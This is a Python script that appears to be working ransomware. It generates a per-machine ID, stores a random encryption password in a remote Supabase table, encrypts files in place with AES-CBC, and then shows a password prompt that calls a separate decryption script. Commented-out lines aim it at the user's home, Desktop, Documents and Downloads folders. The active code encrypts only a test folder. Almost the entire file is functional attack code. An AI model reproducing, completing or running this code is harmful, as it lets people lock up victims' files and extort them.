import os
import secrets
import platform
import uuid
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from supabase import create_client, Client
from dotenv import load_dotenv
import tkinter as tk
from tkinter import messagebox
import sys
import subprocess


# ---------- Supabase Setup ----------
# Load .env
load_dotenv()
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ---------- Crypto Helper ----------
def generate_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def get_or_create_user_id() -> str:
    id_file = os.path.expanduser("~/.user_id")

    # If already generated, load it
    if os.path.exists(id_file):
        with open(id_file, 'r') as f:
            return f.read().strip()

    # Otherwise, generate and save it
    base_name = platform.node()
    unique_suffix = str(uuid.uuid4())
    user_id = f"{base_name}_{unique_suffix}"

    with open(id_file, 'w') as f:
        f.write(user_id)

    return user_id

def encrypt_file(file_path: str, password: str):
    salt = os.urandom(16)
    key = generate_key(password, salt)
    iv = os.urandom(16)

    with open(file_path, 'rb') as f:
        file_data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as enc_file:
        enc_file.write(salt + iv + encrypted_data)

def encrypt_directory(directory_path: str, password: str):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, password)
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

# ---------- Supabase Password for Machine/User ----------
def get_or_create_user_password(user_id: str) -> str:
    # Try to retrieve existing password for this machine
    result = supabase.table("encryption_keys").select("*").eq("user_id", user_id).execute()
    if result.data:
        return result.data[0]['password']

    # Create new password
    new_password = secrets.token_urlsafe(16)
    supabase.table("encryption_keys").insert({"user_id": user_id, "password": new_password}).execute()
    return new_password

# ---------- GUI for Password Input ----------
def ask_for_password():
    user_password = None

    def on_submit():
        nonlocal user_password  # Access outer function's variable
        user_password = password_entry.get()
        window.destroy()  # Close the window

    # Create the Tkinter window
    window = tk.Tk()
    window.title("Enter Decryption Password")
    window.geometry("300x150")

    tk.Label(window, text="Enter Password:").pack(pady=10)
    password_entry = tk.Entry(window, show="*")
    password_entry.pack(pady=5)

    submit_button = tk.Button(window, text="Submit", command=on_submit)
    submit_button.pack(pady=20)

    window.mainloop()

    return user_password    # Return the entered password after window closes

# ---------- Main Script ----------
if __name__ == "__main__":
    # Identify the user/machine
    user_id = get_or_create_user_id()
    print(f"Using unique user ID: {user_id}")

    # Get the user's encryption password
    password = get_or_create_user_password(user_id)

    # Define target folders
    # home = os.path.expanduser("~")
    # target_dirs = [
    #     home,
    #     os.path.join(home, "Desktop"),
    #     os.path.join(home, "Documents"),
    #     os.path.join(home, "Downloads")
    # ]

    # # Encrypt all files in each folder
    # for path in target_dirs:
    #     if os.path.exists(path):
    #         print(f"Encrypting: {path}")
    #         encrypt_directory(path, password)
    #     else:
    #         print(f"Not found: {path}")

    target_folder = "personal_Fa0337"
    if not os.path.exists(target_folder):
        print(f"Folder not found: {target_folder}")
    else:
        encrypt_directory(target_folder, password)
        print("✅ Done encrypting.")
    
    # Open Tkinter window for password input (simulating a decryption attempt)
    print("Password is required to decrypt the files.")
    user_password = ask_for_password()

    # Validate the password by attempting to decrypt one of the files (you can validate this by running the decryption function in the background)
    if not user_password:
        print("No password entered. Exiting...")
        sys.exit(1)

    # For now, you would just print or use a decryption check here (we'll use the decryption function in the background)
    print("Decryption password entered:", user_password)

    # Use subprocess to call the decryption script and validate the password
    try:
        # Call the decryption script with the entered password
        subprocess.run(['python', 'decrypt.py', user_password], check=True)
    except subprocess.CalledProcessError:
        print("[ERROR] Decryption failed. Invalid password.")
        sys.exit(1)

    print("Encryption completed for user:", user_id)
